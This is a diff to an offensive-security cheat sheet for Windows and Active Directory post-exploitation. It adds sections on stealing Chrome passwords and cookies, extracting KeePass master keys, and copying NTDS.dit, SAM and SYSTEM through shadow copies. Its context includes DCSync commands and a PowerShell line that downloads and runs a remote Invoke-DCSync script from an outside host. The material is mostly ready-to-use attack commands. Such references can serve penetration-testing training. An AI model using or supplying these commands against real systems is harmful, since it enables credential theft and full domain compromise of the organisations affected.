@@ -1103,11 +1103,16 @@ Can also use Rebeus (Reflectively Load .NET Assembly.)
 DCSync (Also Post Exploit)
 
 ```powershell
-#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default.
+#Special rights are required to run DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. Note that Read-Only Domain Controllers are not  allowed to pull password data for users by default. 
+
+#and anyone with the Replicating Changes permissions set to Allow (i.e., Replicating Changes All/Replicating Directory Changes)
 
 mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
 
 powershell.exe -Version 2 -Exec Bypass /c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8000/Invoke-DCSync.ps1'); Invoke-DCSync -PWDumpFormat"
+
+
+Empire Module: powershell/credentials/mimikatz/dcsync_hashdump
 ```
 
 
@@ -1247,6 +1252,48 @@ laZagne.exe all
 laZagne.exe browsers
 laZagne.exe browsers -firefox
 
+```
+
+
+
+Dump Chrome Passwords (Also Post Exploit)
+
+```powershell
+#git clone https://github.com/rasta-mouse/CookieMonster
+
+CookieMonster creds
+CookieMonster.exe cookies -d [domain] -e 
+CookieMonster -a 
+
+Must be run in the context of the target users as chrome passwords are encrypted with DPAPI.
+
+Can also use Mimikatz for this.
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data"
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data" /unprotect
+
+mimikatz dpapi::chrome /in:"C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies" /unprotect
+```
+
+
+
+Dump KeePass
+
+```powershell
+#https://github.com/HarmJ0y/KeeThief
+#http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/
+
+Get-Process keepass
+tasklist | findstr keepass
+
+Attacking KeePass
+
+#https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1
+Import-Module KeeThief.ps1
+Get-KeePassDatabaseKey -Verbose
+
+KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll & KeePatched.exe can also be used.
 ```
 
 
@@ -1400,9 +1447,31 @@ Create golden ticket and attack parent domain.
 
 This will not work if there is SID Filtering in place for respective target domain.
 
-harmj0y's article explains it best. 
+harmj0ys article explains it best. 
 
 #http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/
+```
+
+
+
+Dump NTDS.dit
+
+```
+C:\vssadmin create shadow /for=C:
+copy \\?
+\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\ntds\ntds.dit
+.
+copy \\?
+\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SYSTEM
+.
+copy \\?
+\GLOBALROOT\Device\HarddiskVolumeShadowCopy[DISK_NUMBER]\windows\system32\config\SAM
+.
+reg SAVE HKLM\SYSTEM c:\SYS
+vssadmin delete shadows /for= [/oldest | /all | /shadow=]
+
+
+If you pwn a BackupOperator account with SeBackupPrivilege you can also dump NTDS.dit
 ```
 
 
